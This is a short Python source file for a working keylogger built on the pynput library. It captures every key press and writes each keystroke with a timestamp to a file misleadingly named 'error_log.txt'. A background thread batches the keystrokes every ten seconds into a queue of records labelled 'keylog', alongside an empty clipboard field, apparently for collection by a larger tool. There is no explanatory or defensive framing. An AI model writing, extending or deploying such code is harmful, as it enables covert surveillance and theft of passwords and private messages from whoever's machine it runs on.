from pynput import keyboard
import time
import queue
import threading

keystroke_queue = queue.Queue()
keystroke_buffer = []  # To store keystrokes temporarily

def on_press(key):
    """Handle key press events."""
    try:
        key_str = str(key).replace("'", "")
        if key_str.startswith("Key."):
            key_str = f"[{key_str.replace('Key.', '')}]"
        keystroke_buffer.append(key_str)
        with open("error_log.txt", "a") as f:
            f.write(f"Keystroke captured at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {key_str}\n")
    except Exception as e:
        with open("error_log.txt", "a") as f:
            f.write(f"Keylogger error at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {e}\n")

def flush_keystrokes():
    """Periodically flush accumulated keystrokes to the queue."""
    while True:
        if keystroke_buffer:  # Only queue if there are keystrokes
            keystroke_queue.put({
                "keystrokes": keystroke_buffer.copy(),  # Copy to avoid race conditions
                "clipboard": "",
                "timestamp": time.strftime("%Y-%m-%d_%H-%M-%S"),
                "type": "keylog"
            })
            with open("error_log.txt", "a") as f:
                f.write(f"Keystrokes queued at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {len(keystroke_buffer)} keys\n")
            keystroke_buffer.clear()  # Clear the buffer after queuing
        time.sleep(10)  # Wait for 10 seconds

def start_keylogger():
    """Start the keylogger and periodic flush thread."""
    # Start the flush thread
    flush_thread = threading.Thread(target=flush_keystrokes, daemon=True)
    flush_thread.start()
    
    # Start the key listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()